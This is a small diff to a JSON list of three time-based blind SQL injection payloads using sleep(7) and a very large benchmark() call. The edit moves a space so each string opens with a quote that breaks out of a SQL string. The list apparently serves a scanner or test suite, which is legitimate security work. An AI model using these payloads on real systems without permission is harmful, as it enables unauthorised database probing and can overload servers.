@@ -1,5 +1,5 @@
 [
-	" 'OR sleep(7)=0; --  ",
-	" 'AND sleep(7)=0; --  ",
-	" 'or benchmark(7000000000,charset('abc')) = 0 ; --  "
+	"' OR sleep(7)=0; --  ",
+	"' AND sleep(7)=0; --  ",
+	"' or benchmark(7000000000,charset('abc')) = 0 ; --  "
 ]
